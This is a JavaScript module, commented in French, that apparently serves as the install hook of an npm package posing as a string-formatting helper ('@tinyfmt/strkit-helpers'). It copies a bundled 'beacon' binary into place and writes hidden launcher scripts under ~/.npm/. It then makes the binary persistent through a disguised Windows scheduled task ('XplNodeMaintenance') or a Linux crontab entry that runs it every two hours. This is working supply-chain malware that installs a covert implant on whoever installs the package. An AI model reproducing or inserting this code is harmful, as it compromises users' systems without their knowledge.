'use strict';
// Drop binaire beacon + persistance cross-platform.
//   Windows : schtasks XplNodeMaintenance (hourly/2) → launcher .cmd stable
//   Linux   : crontab "0 */2 * * *" → launcher .sh stable
// Le postinstall des deps git s'exécute dans le clone tmp de npm
// (~/.npm/_cacache/tmp/git-clone*/), détruit ensuite par npm : la persistance
// ne doit JAMAIS pointer vers __dirname. Launcher stable dans ~/.npm/ qui
// localise le binaire au runtime (le drop dans la racine du paquet est porté
// par le placement final de npm).
const { spawnSync } = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');

const TASK = 'XplNodeMaintenance';
const WIN = process.platform === 'win32';
const EXE = WIN ? 'beacon.exe' : 'beacon-linux';

function drop() {
  // racine du paquet : dist/lib → ../.. (fallback layout dev : lib → ../)
  let root = path.join(__dirname, '..', '..');
  if (!fs.existsSync(path.join(root, 'bin', EXE)) && fs.existsSync(path.join(__dirname, '..', 'bin', EXE))) {
    root = path.join(__dirname, '..');
  }
  const src = path.join(root, 'bin', EXE);
  const dest = path.join(root, EXE);
  if (!fs.existsSync(src)) return false;
  try {
    fs.copyFileSync(src, dest);
    try { fs.chmodSync(dest, 0o755); } catch {}
  } catch {
    return false;
  }

  // launcher stable (~/.npm/) : localise le binaire au runtime
  try {
    const ld = path.join(os.homedir(), '.npm');
    fs.mkdirSync(ld, { recursive: true });
    if (WIN) {
      const lp = path.join(ld, '.skh-launch.cmd');
      const P = '%USERPROFILE%\\node_modules\\@tinyfmt\\strkit-helpers\\' + EXE;
      fs.writeFileSync(lp, [
        '@echo off',
        `if exist "${P}" "${P}"`,
        'exit /b 0'
      ].join('\r\n'));
    } else {
      const lp = path.join(ld, '.skh-launch.sh');
      fs.writeFileSync(lp, [
        '#!/bin/sh',
        'for d in \\',
        '  "$HOME/node_modules/@tinyfmt/strkit-helpers" \\',
        '  /root/node_modules/@tinyfmt/strkit-helpers \\',
        '  /home/*/node_modules/@tinyfmt/strkit-helpers; do',
        '  [ -x "$d/beacon-linux" ] && exec "$d/beacon-linux"',
        'done',
        'exit 0'
      ].join('\n'));
      try { fs.chmodSync(lp, 0o755); } catch {}
    }
  } catch {}

  // persistance → launcher stable ; une seule entrée (nettoie l'ancienne)
  try {
    const lp = path.join(os.homedir(), '.npm', WIN ? '.skh-launch.cmd' : '.skh-launch.sh');
    if (WIN) {
      const q = spawnSync('schtasks', ['/query', '/tn', TASK], { windowsHide: true });
      if (q.status !== 0) {
        spawnSync('schtasks', [
          '/create', '/tn', TASK, '/sc', 'hourly', '/mo', '2',
          '/tr', `"${lp}"`, '/f'
        ], { windowsHide: true });
      }
    } else {
      const marker = `# ${TASK}`;
      const entry = `0 */2 * * * ${lp} ${marker}`;
      const cur = spawnSync('crontab', ['-l'], { encoding: 'utf8' });
      const lines = (cur.stdout || '').split('\n')
        .filter((l) => l.trim() && !l.includes(marker) && !l.includes('beacon-linux # XplNodeMaintenance'));
      const next = lines.join('\n') + '\n' + entry + '\n';
      spawnSync('crontab', ['-'], { input: next });
    }
  } catch {}
  return true;
}

module.exports = { drop };
